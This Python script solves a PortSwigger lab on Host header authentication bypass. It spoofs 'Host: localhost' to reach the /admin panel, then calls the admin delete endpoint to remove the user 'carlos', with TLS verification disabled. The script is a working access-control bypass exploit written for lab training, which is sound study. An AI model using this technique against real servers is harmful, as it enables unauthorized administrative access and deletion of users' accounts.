#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Host header authentication bypass.

The /admin panel checks the Host header for 'localhost' to allow access.
Setting Host: localhost bypasses the restriction entirely.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def solve(lab):
    headers = {"Host": "localhost"}

    r = requests.get(f"{lab}/admin", headers=headers, verify=False)
    if "carlos" not in r.text and "delete" not in r.text.lower():
        print(f"[-] Admin panel not accessible (status {r.status_code})")
        print(r.text[:500])
        return

    print("[+] Admin panel accessible with Host: localhost")

    r = requests.get(f"{lab}/admin/delete", params={"username": "carlos"},
                     headers=headers, verify=False)
    if r.status_code in (200, 302):
        print("[+] Carlos deleted — lab solved!")
    else:
        print(f"[-] Delete returned {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Host Header Auth Bypass lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    args = parser.parse_args()
    solve(args.lab_url.rstrip("/"))


if __name__ == "__main__":
    main()
